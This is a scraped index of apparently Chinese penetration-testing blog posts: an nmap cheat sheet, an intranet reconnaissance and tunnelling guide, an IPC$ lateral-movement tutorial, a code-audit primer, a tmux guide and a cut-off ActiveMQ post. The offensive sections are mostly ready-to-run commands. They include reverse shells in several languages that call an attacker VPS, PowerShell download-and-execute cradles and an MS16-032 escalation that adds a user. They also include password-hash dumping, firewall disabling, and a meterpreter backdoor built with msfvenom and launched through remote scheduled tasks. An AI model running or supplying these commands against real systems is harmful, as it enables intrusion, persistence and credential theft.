--script=http-aspnet-debug [--script-args=http-aspnet-debug.path=path] \u0026lt;target\u0026gt;   扫描HTTP认证服务 1  nmap -sV -p -sV 80 --script http-auth [--script-args=http-auth.path=/login] \u0026lt;host\u0026gt;   扫描SSL服务 1  nmap -sV -p -sV 443 --script ssl-*,sslv2-sV -p -sV,tls-alpn,tls-nextprotoneg \u0026lt;host\u0026gt;   Memcache数据库 1  nmap -sV -p11211 --script memcached-info \u0026lt;host\u0026gt;   扫描DB2数据库 1  nmap --script broacast-db2-discover ,db2-das-info \u0026lt;host\u0026gt;   扫描SQL Server服务 1 2 3 4 5  获取mssql信息 # nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24 扫描mssql sa空密码 # nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24 sa弱口令爆破 # nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24 利用xp_cmdshell,远程执行系统命令 # nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24 导出mssql中所有的数据库用户及密码hash # nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24   扫描Cassandra服务 1  nmap -sV -p -sV 9160 --script cassandra-info \u0026lt;host\u0026gt;   扫描MongoDB相关服务 1 2  尝试爆破mongdb # nmap -p 27017 --script mongodb-brute 192.168.3.0/24 验证mongodb未访问授权 # nmap -p27017 —script mongodb-info 192.168.3.0/24   扫描Informix服务 1  nmap -p 9088 --script informix-brute.nse 192.168.3.23   扫描CouchDB服务 1  nmap -sV -p -sV 5984 --script \u0026#34;couchdb-*\u0026#34; \u0026lt;host\u0026gt;   扫Redis服务 1 2  redis爆破 # nmap -p 6379 --script redis-brute.nse 192.168.3.0/24 redis未访问授权 # nmap -p6379 —-script redis-info 192.168.3.0/24   扫描MySQL服务 1 2 3 4 5 6  mysql-info ·# nmap -sV -p -sV 3306 --script mysql-info \u0026lt;host\u0026gt; mysql 扫描root空密码 # nmap -p 3306 --script mysql-empty-password.nse -v \u0026lt;host\u0026gt; mysql root弱口令简单爆破 # nmap -p 3306 --script mysql-brute.nse -v \u0026lt;host\u0026gt; 导出mysql中所有用户的hash # nmap -p 3306 --script mysql-dump-hashes --script-args=\u0026#39;username=root,password=root’ \u0026lt;host\u0026gt;  Mysql身份认证漏洞 # nmap -p 3306 --script mysql-vuln-cve2012-2122.nse -v \u0026lt;host\u0026gt;   扫描memcached服务 1  验证Memcached未授权访问漏洞 # nmap -sV -p11211 —script memcached-info 192.168.1.2/24   扫描PostgreSQL服务 1  尝试爆破postgresql # nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24   扫描Oracle服务 1 2 3 4  nmap -sV -p -sV 1521 --script =oracle-tns-version \u0026lt;host\u0026gt; 尝试爆破oracle # nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24 # nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24   扫描RDP服务 1  nmap -sV -p -sV 3389 --script rdp-enum-encryption \u0026lt;host\u0026gt;   扫描SSH服务 1  nmap -p 22-sV --script ssh2-enum-algos \u0026lt;host\u0026gt;   扫描VMware服务 1  nmap -sV -p -sV 443 --script vmware-version \u0026lt;host\u0026gt;   扫描VNC服务 1  nmap -sV -p -sV 5900 --script \u0026#34;vnc-*\u0026#34; \u0026lt;host\u0026gt;   扫描IMAP服务 1  nmap -sV -p -sV 143 --script=\u0026#34;imap-*\u0026#34; \u0026lt;host\u0026gt;   扫描POP3服务 1  nmap -sV -p -sV 110,995 --script pop-3-ntlm-info \u0026lt;host\u0026gt;   扫描SMTP服务 1  nmap -sV -p -sV 25 --script smtp-ntlm-info \u0026lt;host\u0026gt;   字典DICT服务 1  nmap -sV -p -sV 2628 --script dict-info \u0026lt;host\u0026gt;   扫描IRC服务 1  nmap -sV -p -sV 6667 --script irc-info \u0026lt;host\u0026gt;   扫描硬盘监测服务 1  nmap -sV -p -sV 7634 --script hddtemp-info \u0026lt;host\u0026gt;   扫描Rsync服务 1  rsync未授权访问 nmap -sV -p -sV —-script rsync-brute —-script-args ‘rsync-brute.module=www’ \u0026lt;target\u0026gt;   扫描Elasticsearch服务 1  验证Elasticsearch未访问授权 # nmap —-script http-vuln-cve2015-1427 —-script-args command=‘ls’ 192.168.3.0/24    MS12-020 1  nmap -sV -p3389 --script rdp-vuln-ms12-020 \u0026lt;host\u0026gt;   参考 精通Nmap脚本引擎\nCVE漏洞检测\n","description":"","id":96,"section":"en","tags":null,"title":"Nmap","uri":"http://crkmythical.github.io/en/blog/nmap/"},{"content":"程序=算法+代码\n代码=函数+变量+（流程控制）\n漏洞形成的条件：\n 一、变量可控 一切输入都是有害的 二、变量传递到有利用价值的函数（可利用函数）  漏洞造成的效果：\n漏洞的利用效果取决于最终函数的功能\n变量进入什么样的函数就会导致什么样的效果\n危险函数：\n函数的功能 导致 漏洞的种类\n 文件包含：包含漏洞 代码执行：执行任意代码漏洞 命令执行：执行任意命令漏洞 文件系统操作：文件/目录 读写删除等漏洞 数据库操作：SQL注入漏洞 数据显示：xss等客户端漏洞 。。。  变量跟踪分类：\n 正向跟踪：通过变量找函数 逆向跟踪：通过函数找变量  代码审计的本质\n找漏洞=找对应变量与函数\n变量就是漏洞（bug）本身，函数就是这个bug的爪子/衣服/种类\n","description":"","id":97,"section":"en","tags":[""],"title":"代码审计概念","uri":"http://crkmythical.github.io/en/blog/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5/"},{"content":"1.1. 本机信息 1.1.1. 手动收集 1.1.1.1. 用户列表/管理员 net user | net localgroup administrators 当前在线用户 query user\n1.1.1.2. 网络配置 ipconfig /all 1.1.1.3. 操作系统及补丁 wmic qfe list brief\u0026gt;tmp.txt 当前系统信息 systeminfo | findstr \u0026quot;OS KB\u0026quot;\n1.1.1.4. 系统架构 echo %processor_architecture% 1.1.1.5. 本机服务信息 wmic service list brief\u0026gt;tmp.txt 1.1.1.6. 安装软件 wmic product get name,version,installlocation \u0026gt;tmp.txt 利用PowerShell收集软件\n\u0026quot;Get-WmiObject -Class win32_product | Select-Object -Property name,version,installlocation\u0026quot;\n1.1.1.7. 端口列表 netstat -ano 1.1.1.8. 进程列表 wmic process list brief\u0026gt;tmp.txt 当前进程信息tasklist\n1.1.1.9. 开机自动程序 wmic startup list brief \u0026gt;tmp.txt 1.1.1.10. 计划任务 schtasks /query /fo table /v \u0026gt;tmp.txt 1.1.1.11. 本地计算机和所连接客户端之间会话 net session 1.1.1.12. 本机共享列表 wmic share get name,path,status \u0026gt;tmp.txt 共享列表 net share \n1.1.1.13. 路由表/ARP缓存表 route print | arp -a 1.1.1.14. 防火墙相关配置 1.1.1.14.1. 查看防火墙配置 netsh firewall show config 1.1.1.14.2. 关闭防火墙 netsh advfirewall set allprofiles state off win2003之前版本 netsh firewall set opmode disable\n1.1.1.14.3. 修改防火墙配置   允许指定程序进入\nnetsh advfirewall firewall add rule name=\u0026quot;pass nc\u0026quot; dir=in action=allow program=\u0026quot;C: c.exe\u0026quot;\n  允许指定程序外出\nnetsh advfirewall firewall add rule name=\u0026quot;allow nc\u0026quot; dir=out action=allow program=\u0026quot;C: c.exe\u0026quot;\n  允许3389端口放行\nnetsh advfirewall firewall add rule name=\u0026quot;remote desktop\u0026quot; protocol=TCP dir=in localport=3389 action=allow\n netsh firewall add allowedprogram c:\nc.exe \u0026ldquo;allow nc\u0026rdquo; enable #win2003之前版本\n   1.1.1.14.4. 更改防火墙日志文件存储 netsh advfirewall set currentprofile logging filename \u0026quot;C:\\windows\\temp\\fw.log\u0026quot;\n1.1.1.15. 代理配置 reg query \u0026quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\u0026quot; 1.1.1.16. 开启RDP服务  查询\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026quot; /V PortNumber  1.1.2. 自动收集 1.1.2.1. wmic信息收集 1.1.2.2. Empire信息收集 1.2. 判断域环境 1.2.1. 是否存在域 systeminfo | findstr \u0026quot;\\.\u0026quot; 1.2.2. DNS与本机是否网段 ipconfig /all 1.2.3. DNS与域是否同IP nslookup hacker.testlab 1.2.4. 当前登录域及登录用户信息 net config workstation 1.2.5. 判段主域 net time /domain 1.2.6. 获取域SID whoami /all 1.2.7. 指定域用户详细信息 net user xxx /domain 1.3. 搜集域内基础信息 1.3.1. 查询域 net view /domain 1.3.2. 查询域内所有主机 net view /domain:hacker 1.3.3. 查询域内所有用户组列表 net group /domain 1.3.4. 查询域内成员计算机列表 net gorup \u0026quot;domain computers\u0026quot; /domain  1.3.5. 获取域密码信息 net accounts /domain  1.3.6. 获取域信任信息 nltest /domain_trusts 1.4. 查找域控制器 1.4.1. DC组 net group \u0026quot;domain controllers\u0026quot; /domain 1.4.2. DC机器名 nltest /dclist:hacker 1.4.3. DC主机名 nslookup -type=srv _ldap._tcp 1.4.4. 主域DC netdom query pdc 1.5. 获取域内用户和管理员信息 1.5.1. 域内用户列表 net user /domain 1.5.2. 域管理员用户 net group \u0026quot;domain admins\u0026quot; /domain  net group \u0026quot;enterprise admins\u0026quot; /domain\n1.5.3. 域内用户详细信息 wmic useraccount get /all 1.5.4. 域内存在的用户 dsquery user 1.6. 定位域管理员 1.6.1. psloggedon.exe \\\\DC 1.6.2. PVEFindADUser.exe -current 1.6.3. netview.exe 1.6.4. nmap \u0026ndash;script smb-enum-sessions \u0026lt;ip\u0026gt;  smb-enum-domains 对DC进行信息收集 smb-enum-users 枚举域内用户 smb-enum-shares 枚举共享目录 smb-enum-process 枚举进程 smb-enum-sessions 枚举域内用户登录会话 smb-os-discovery 收集系统信息  1.6.5. PowerSploit  1.6.6. Empire \u0026gt;situaltional_awareness/network/powerview/user_hunter 1.7. 查找域管理进程 1.7.1. DC的域用户会话  域控制器列表 net group \u0026quot;domain controllers\u0026quot; /domain \u0026gt;dics.txt 域管理员列表 net group \u0026quot;domain admins\u0026quot; /domain \u0026gt;admins.txt 活动域会话列表 netsess.exe -h 域用户会话-GDA  for /f %i in (dcs.txt) do @echo [+] Querying DC %i \u0026amp;\u0026amp; @netsess -h %i 2\u0026gt;null \u0026gt;sessions.txt \u0026amp;\u0026amp; for /f %a in (admins.txt) do @type sessions.txt | @findstr /I %a 1.7.2. 远程系统中运行的任务 step1: net group \u0026quot;domain admins\u0026quot; /domain \u0026gt; admins.txt step2: netsess -h \u0026gt;ips.txt step3: for /f %ip in (ips.txt) do @echo [+] %ip \u0026amp;\u0026amp; @tasklist /v /s %ip /U user /P password 2\u0026gt;null \u0026gt;output.txt \u0026amp;\u0026amp; for /f %admin in (admins.txt) do @type output.txt | @findstr %admin \u0026gt;null \u0026amp;\u0026amp; @echo [!] %admin was found running a process on %ip \u0026amp;\u0026amp; pause 1.7.3. 扫描远程系统NetBIOS信息 for /f %ip in (ips.txt) do @echo [+] Checking %ip \u0026amp;\u0026amp; nbtstat -A \u0026amp;ip 2\u0026gt;null \u0026gt;nbsession.txt \u0026amp;\u0026amp; for /f %user in (admins.txt) do @type nbsessions.txt | findstr /I %user \u0026gt;null \u0026amp;\u0026amp; echo [!] %user was found logged into %ip 1.7.4. 域用户的进程 tasklist /v | findstr \u0026quot;hacker\u0026quot;  1.8. 域分析工具Bloodhound 1.9. 探测域内存活主机 1.9.1. 利用NetBIOS探测 nbt.exe 192.168.1.0/24 1.9.2. 利用ICMP协议探测 for /L %I in (1,1,254) do @ping -w 1 -n 1 192.168.1.%I | findstr \u0026quot;TTL=\u0026quot; 1.9.3. 利用ARP协议探测 arp.exe -t 192.168.1.0/24  Empire\u0026gt;usemodule powershell/situational_awareness/network/arpscan Powershell  powershell.exe -exec bypass -command \u0026quot;\u0026amp; {import-module C:\\windows\\temp\\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24}\u0026quot; \u0026gt;\u0026gt; C:\\windows\\temp\\log.txt    1.9.4. 通过TCP/UDP协议探测 nmap -sT -sU  1.10. 扫描域内端口 1.10.1. netcat扫描 nc -nvv -w 1 -z 10.1.1.1 3388-27017 //TCP nc -nvv -w 1 -z -u 10.1.1.1 3388-3389 //UDP 1.10.2. 利用telnet命令扫描 telnet \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; 1.10.3. 利用msfconsole use auxiliary/scanner/portscan/tcp 1.10.4. 利用powersploit Invoke-Portscan powershell.exe -nop -exec bypass -c \u0026quot;IEX(New-object Net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA C:windows\\temp es.txt \u0026quot; 1.10.5. 利用Nishang Invoke-Portscan Invoke-Portscan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost 2. 隐藏通信隧道技术 2.1. 基础知识 2.1.1. 隧道-一种绕过端口屏蔽的通信方式  攻击机发出的数据包封装成防火墙允许的数据包格式，经过防火墙允许的端口，从而穿过防火墙，与目标机进行通信。\n  网络层 ：IPv6，ICMP，GRE 传输层：TCP，UDP，常规端口转发 应用层：SSH，HTTP，HTTPS，DNS  2.1.2. 内网连通性判断  判断域内及其能否上外网\n内网中是否有proxy server\n 查看内网hostname=*proxy*\ncurl www.baidu.com //不同\ncurl -x proxy-ip:port www.baidu.com //通   2.1.2.1. ICMP协议 ping baidu.com 2.1.2.2. TCP协议 nc -zv \u0026lt;target\u0026gt; \u0026lt;port\u0026gt; 2.1.2.3. HTTP(S)协议 curl \u0026lt;target\u0026gt;:\u0026lt;port\u0026gt; 2.1.2.4. DNS协议 dig @vps-ip www.baidu.com A  windows : nslookup www.baidu.com vips-ip\n 2.2. 网络层层隧道技术 2.2.1. IPv6隧道-socat，6tunnel，nt6tunnel  将IPv6数据报文封装在IPv4数据报文中\n 2.2.2. ICMP隧道-icmpsh,pingTunnel,icmptunnel,powershell icmp  将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问\n 2.2.2.1. icmpsh target: icmpsh.exe -t kali-ip -d 500 -b 30 -s 128 kali: apt install python-impacket git clone https://github.cominquisb/icmpsh.git /opt/icmpsh sysctl -w net.ipv4_icmp_echo_ignore_all=1 ./run.sh 2.2.2.2. PingTunnel  http://www.cs.uit.no/~daniels/PingTunnel/index.html\n kali:192.168.10 web server:192.168.1.4 /1.1.1.x sql server:1.1.1.10 kali: ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389 2.3. 传输层隧道技术 2.3.1. Socket隧道：LCX/portmap端口转发 \u0026gt;端口转发 target: lcx.exe -slave vps-ip 4444 127.0.0.1 3389 //将本机3389端口所有数据转发到vps-ip上的4444端口 vps-ip: lcx.exe -listen 4444 5555 //将本地4444端口监听的数据转发到5555端口 mstsc //127.0.0.1:5555-\u0026gt;target:3389 \u0026gt;本地端口映射 target: lcx.exe -tran 53 127.0.0.1 3389 //防火墙禁止3389后，可将3389端口数据转发到本地53端口 2.3.2. Netcat 2.3.2.1. 常见使用场景  banner获取 nc -nv ip port \n连接主机nc -nvv ip port \n扫描端口nc -v -z ip port1-port2\n监听端口nc -l -p 9999\n简易聊天室\n 服务端：nc -lp 8888 客户器：nc -nv \u0026lt;client-ip\u0026gt; 8888\n文件传输 接收方 ：nc -lp 8888 \u0026gt; 1.txt //192.168.1.1 发送方：nc -nv 192.168.1.1 8888 \u0026lt; test.txt -q 1   2.3.2.2. 获取shell \u0026gt;正向shell: 客户端 ----\u0026gt; 服务器的shell //客户端获取服务器的shell 客户端(192.168.1.114): nc 10.10.10.115 4444 服务器(10.10.10.115): nc -lvp 4444 -e /bin/sh //linux nc -lvp 4444 -e c:\\windows\\system32\\cmd.exe //windows \u0026gt;反向shell： 客户端的shell \u0026lt;---- 服务器 //服务器获取客户端的shell 服务器(10.10.10.115)： nc -lvp 9999 客户端(192.168.1.114): nc 10.10.10.115 9999 -e /bin/sh //linux nc 10.10.10.115 9999 -e c:\\windows\\system32\\cmd.exe //windows 2.3.2.3. 获取反向shell vps: nc -lvp 2222 \u0026gt;-----python反向shell------- python -c ' import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026quot;vps-ip\u0026quot;,2222)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]); ' \u0026gt;-----------Bash反向shell--------- bash -i \u0026gt;\u0026amp; /dev/tcp/vps-ip/4444 0\u0026gt;\u0026amp;1 \u0026gt;-----------PHP反向shell--------- php -r ' $sock=fsockopen(\u0026quot;vps-ip\u0026quot;,2222); exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;); ' \u0026gt;----------Perl反向shell-------- perl -e ' use Socket; $i=\u0026quot;192.168.1.117\u0026quot;;$p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026quot;tcp\u0026quot;)); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;); open(STDOUT,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;); open(STDERR,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;); exec(\u0026quot;/bin/sh -i\u0026quot;); }; ' \u0026gt; 2.3.2.4. Netcat内网代理 --------------------------------------------------------------- VPS(192.168.1.4) Web Server(192.168.1.1/1.1.1.116) MySQL Server(1.1.1.200) ---------------------------------------------------------------- step1: vps: nc -lvp 3333 step2: MySQL:nc -lvp 3333 -e /bin/sh step3: Web :nc -v 192.168.1.4 3333 -c \u0026quot;nc -v 1.1.1.200 3333\u0026quot; \u0026gt; 2.3.3. PowerCat  nc的powershell版本\n 2.3.3.1. powercat常用操作 #powercat正向shell win10(192.168.1.119): powercat -l -p 8888 -e cmd.exe -v kali(192.168.1.119): nc 192.168.1.119 8888 ------------------------------- #powercat反弹shell win10(192.168.1.119): powercat -c 192.168.1.119 -p 8888 -v -e cmd.exe kali(192.168.1.119): nc -lvp 8888 -------------------------------------- #返回powershell powercat -c vps -p 9999 -v -ep ----------------------------- #传输文件 powercat -l -p 8888 -of test.txt -v powercat -c vps 8888 -i c:\\test.txt -v ----------------------------- #生成payload powercat -l -p 8888 -e cmd -v -ge \u0026gt;\u0026gt;shell.ps1 \u0026gt; 2.3.3.2. powercat DNS隧道通信 kali :192.168.1.117 win10:192.168.1.119 --------------------------------------- kali: ruby dnscat2.rb -e open --no-cache ttpowercat.test win10: powercat -c 192.168.1.117 -p 53 -dns ttpowercat.test -e cmd.exe 2.4. 应用层隧道技术 2.4.1. SSH协议隧道 使用SSH反向隧道进行内网穿透 \n2.4.1.1. 本地端口转发 kali: 192.168.1.117 MacBook :192.168.1.121 win10 :192.168.1.119 --------------------------------------------------- kali: 127.0.0.1:444 --\u0026gt; 192.168.1.119:3389 ssh -CfNg -L 4444:192.168.1.119:3389 ethan@192.168.1.121 2.4.1.2. 远程端口转发 kali: 192.168.1.117 MacBook :192.168.1.121 win10 :192.168.1.119 --------------------------------------------------- MacBook: 192.168.1.117:4444 --\u0026gt; 192.168.1.119:3389 ssh -CfNg -R 4444:192.168.1.119:3389 kali@192.168.1.117 2.4.1.3. 动态端口转发（加密socks) kali: 192.168.1.117 MacBook :192.168.1.121 win10 :192.168.1.119 --------------------------------------------------- kali: 192.168.1.117:4444 --\u0026gt; 192.168.1.119:3389 ssh -CfNg -D 4444 ethan@192.168.1.121 2.4.2. HTTP/HTTPS协议隧道 2.4.2.1. reGeorg python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp 2.4.2.2. proxytunnel 2.4.3. DNS协议隧道 2.4.3.1. Dnscat2 2.4.3.2. iodine 2.5. SOCKS代理  Socket隧道具备2端\n服务端：监听一个端口，等待客户端连接\n客户端：传入服务端IP地址和端口，才能主动与服务器连接\n 2.5.1. Proxychains 2.5.2. SocksCap64 2.5.3. Proxifier 2.5.4. EarthWorm 2.5.5. Termite 2.5.6. reGeorg 2.6. 数据通信 2.6.1. 压缩数据 7zip\n\u0026gt;压缩文件： 7z.exe a -r -p12345 E:\\path\\to\\file.7z C:\\path\\to\\file\\ \u0026gt;解压文件： \u0026gt;7z.exe x -p12345 E:\\path\\to\\file.7z -o E:\\x 2.6.2. 传输数据  https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA\n 2.6.3. 利用FTP协议 2.6.4. 利用Debug上传 2.6.5. 利用Nishang上传-download-execute 2.6.6. 利用bitsadmin下载 2.6.7. 利用powershell下载 3. Windows权限提升分析及防御 3.1. 系统内核溢出漏洞提权分析及防范 Windows Exploit Suggester\n3.1.1. MS16-032提权-KB3139914 powershell.exe -nop -exec bypass -c \u0026quot;IEX (New-Object Net.Webclient).DownloadString(\u0026quot;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1\u0026quot;);Invoke-MS16-032 -Application cmd.exe -Commandline '/c net admins 12345 /add' \u0026quot; 3.2. windows操作系统配置错误利用分析及防范 3.2.1. 注册表键AlwaysInstallElevated  gpedit.msc \u0026gt;windows Installer-永远以高权限进行安装\n 3.2.2. 可信任服务路径漏洞  一个服务的可执行文件的路径没有被双引号引起来，且包含空格，则存在此漏洞\n 若路径与服务有关，则创建一个服务或编译service模版 若路径与可执行文件有关，则创建一个可执行文件   3.3. 组策略首选项提权分析及防范 3.4. 绕过UAC提权分析及防范 3.5. 令牌窃取分析及防范 3.6. 无凭证条件下的权限分析及防范 ","description":"","id":98,"section":"en","tags":null,"title":"内网信息收集","uri":"http://crkmythical.github.io/en/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"content":"Installation $ cd $ git clone https://github.com/gpakosz/.tmux.git $ ln -s -f .tmux/.tmux.conf $ cp .tmux/.tmux.conf.local . Key-Bindings  \u0026lt;prefix\u0026gt; Ctrl + a or Ctrl + b \u0026lt;prefix\u0026gt; c Ctrl + a + c \u0026lt;prefix\u0026gt; C-c Ctrl + a + Ctrl + c \u0026lt;prefix\u0026gt; ? manual \u0026lt;prefix\u0026gt; d detached the current session \u0026lt;ctrl\u0026gt; +d kill current session \u0026lt;prefix\u0026gt; d close current panel  This configuration uses the following bindings:\n \u0026lt;prefix\u0026gt; e opens ~/.tmux.conf.local \u0026lt;prefix\u0026gt; r reloads ~/.tmux.conf.local C-l clears both the screen and the tmux history  Session Operation:  \u0026lt;prefix\u0026gt; C-c creates a new session \u0026lt;prefix\u0026gt; C-f lets you switch to another session by name \u0026lt;prefix\u0026gt; $ rename session name \u0026lt;prefix\u0026gt; s list sessions  Windows Operation:  \u0026lt;prefix\u0026gt; C-h and \u0026lt;prefix\u0026gt; C-l let you navigate windows \u0026lt;prefix\u0026gt; c create window \u0026lt;prefix\u0026gt; w list windows \u0026lt;prefix\u0026gt; Tab brings you to the last active window \u0026lt;prefix\u0026gt; 1,2,3 let you navigate to specific window \u0026lt;prefix\u0026gt; , rename current window \u0026lt;prefix\u0026gt; \u0026amp; close current window \u0026lt;prefix\u0026gt; f find specific window by name  Panel Operation:   \u0026lt;prefix\u0026gt; / splits the current pane vertically\n  \u0026lt;prefix\u0026gt; - splits the current pane horizontally\n  \u0026lt;prefix\u0026gt; h, \u0026lt;prefix\u0026gt; j, \u0026lt;prefix\u0026gt; k and \u0026lt;prefix\u0026gt; l let you navigate\n  \u0026lt;prefix\u0026gt; o navigate panels\n  \u0026lt;prefix\u0026gt; H, \u0026lt;prefix\u0026gt; J, \u0026lt;prefix\u0026gt; K, \u0026lt;prefix\u0026gt; L let you resize panes\n  \u0026lt;prefix\u0026gt; \u0026lt; and \u0026lt;prefix\u0026gt; \u0026gt; let you swap panes\n  \u0026lt;prefix\u0026gt; + maximizes the current pane to a new panel\n  \u0026lt;prefix\u0026gt; x kill the current panel\n  \u0026lt;prefix\u0026gt; m toggles mouse mode on or off\n  \u0026lt;prefix\u0026gt; \u0026lt;space\u0026gt;  切换窗格布局\n  \u0026lt;prefix\u0026gt; Enter enters copy-mode\n  \u0026lt;prefix\u0026gt; b lists the paste-buffers\n  \u0026lt;prefix\u0026gt; p pastes from the top paste-buffer\n  \u0026lt;prefix\u0026gt; P lets you choose the paste-buffer to paste from\n  Configuration file: ~/.tmux.conf.local\nvariables:\ntmux_conf_theme_left_separator_main='\\uE0B0' tmux_conf_theme_left_separator_sub='\\uE0B1' tmux_conf_theme_right_separator_main='\\uE0B2' tmux_conf_theme_right_separator_sub='\\uE0B3' Configuring the status line Edit the ~/.tmux.conf.local file (\u0026lt;prefix\u0026gt; e) and adjust the\ntmux_conf_theme_status_left and tmux_conf_theme_status_right variables to\nyour own preferences.\nThis configuration supports the following builtin variables:\n #{battery_bar}: horizontal battery charge bar #{battery_percentage}: battery percentage #{battery_status}: is battery charging or discharging? #{battery_vbar}: vertical battery charge bar #{circled_session_name}: circled session number, up to 20 #{hostname}: SSH/Mosh aware hostname information #{hostname_ssh}: SSH/Mosh aware hostname information, blank when not\nconnected to a remote server through SSH/Mosh #{loadavg}: load average #{pairing}: is session attached to more than one client? #{prefix}: is prefix being depressed? #{root}: is current user root? #{synchronized}: are the panes synchronized? #{uptime_y}: uptime years #{uptime_d}: uptime days, modulo 365 when #{uptime_y} is used #{uptime_h}: uptime hours #{uptime_m}: uptime minutes #{uptime_s}: uptime seconds #{username}: SSH/Mosh aware username information #{username_ssh}: SSH aware username information, blank when not connected\nto a remote server through SSH/Mosh  Beside custom variables mentioned above, the tmux_conf_theme_status_left and\ntmux_conf_theme_status_right variables support usual tmux syntax, e.g. using\n#() to call an external command that inserts weather information provided by\nwttr.in:\ntmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} #(curl wttr.in?format=3) , %R , %d %b | #{username}#{root} | #{hostname} ' Accessing the macOS clipboard from within tmux sessions [Chris Johnsen created the reattach-to-user-namespace\nutility][reattach-to-user-namespace] that makes pbcopy and pbpaste work\nagain within tmux.\nTo install reattach-to-user-namespace, use either MacPorts or\nHomebrew:\n $ port install tmux-pasteboard\nor\n`$ brew install reattach-to-user-namespace`  Once installed, reattach-to-usernamespace will be automatically detected.\ntmux终端复用神器\nTmux 快捷键\n多窗口管理器Tmux - 从入门到精通\n优雅地使用命令行：Tmux 终端复用 \n[结对编程利器：SSH和Tmux]\n","description":"","id":99,"section":"en","tags":null,"title":"Tmux","uri":"http://crkmythical.github.io/en/blog/tmux/"},{"content":"IPC$(Internet Process Connection)是共享\u0026quot;命名管道\u0026quot;的资源。 它是为了让进程间通信而开放的命名管道，\n通过提供可信任的用户名和口令，\n连接双方可以建立安全的通道并以此通道进行加密数据的交换，\n从而实现对远程计算机的访问。\n使用条件：\n 开放了139、445端口； 目标开启ipc$文件共享； 获取用户账号密码。  msfvenom生成后门 1  msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.79.207 LPORT=4444 -f exe \u0026gt; ./test.exe   与目标建立ipc$连接 1 2 3 4 5 6 7 8 9 10 11  #建立ipc连接 net use \\\\10.211.55.9\\ipc$ /u:adminstrator \u0026lt;password\u0026gt; #查看已建立的连接 net use #挂载目标c盘到本地，盘符为z net use z: \\\\10.211.55.9\\c$ #查看目标网路共享的资源 net view \\\\10.211.55.9   拷贝test.exe到目标网络 #拷贝本地文件到目标C:\\windows\\temp\\中 copy test.exe \\\\10.211.55.9\\c$\\windows\\temp\\ #下载目录C:\\windows\\temp\\hash.txt文件到本地 copy \\\\10.211.55.9\\c$\\windows\\temp\\aaa.txt 4.启用计划任务执行 使用schtasks.exe命令 #在目标上创建计划任务task_name1 schtasks /create /tn task_name1 /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tr c:\\windows\\temp\\test.exe /sc onstart /ru system #执行目标上的计划任务task_name1 schtasks /run /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tn task_name1 # 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update schtasks /create /tn \u0026quot;plugin_update\u0026quot; /tr c:\\windows\\temp\\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p \u0026quot;1qaz@WSX\u0026quot; #删除目标上的计划任务task_name1 schtasks /delete /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tn task_name1 /f 使用at命令 #查看目标上的时间 net time \\\\10.211.55.9 #设定目标上的定时执行的任务 at \\\\10.211.55.9 13:54 c:\\windows\\temp test.exe #删除目标上的定时任务 at \\\\10.211.55.9 at \\\\10.211.55.9 \u0026lt;id\u0026gt; /del ","description":"","id":100,"section":"en","tags":null,"title":"IPC Basic Operation","uri":"http://crkmythical.github.io/en/blog/ipc-basic-operation/"},{"content":"[toc]\nActiveMQ是Apache使用纯Java语言编写的开源消息中间件,\nhttps://juejin.cn/post/6844903920209231886\n信息收集 ╭─ethan@ethan.local ~ ╰─➤ nmap 10.184.67.63 -sV -Pn -T4 -p 61616 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 17:00 CST Nmap scan report for 10.184.67.63 Host is up (0.047s latency). PORT STATE SERVICE VERSION 61616/tcp open apachemq ActiveMQ OpenWire transport 5.14.0 (Java 1.8.0_172; arch: amd64) Service Info: OS: 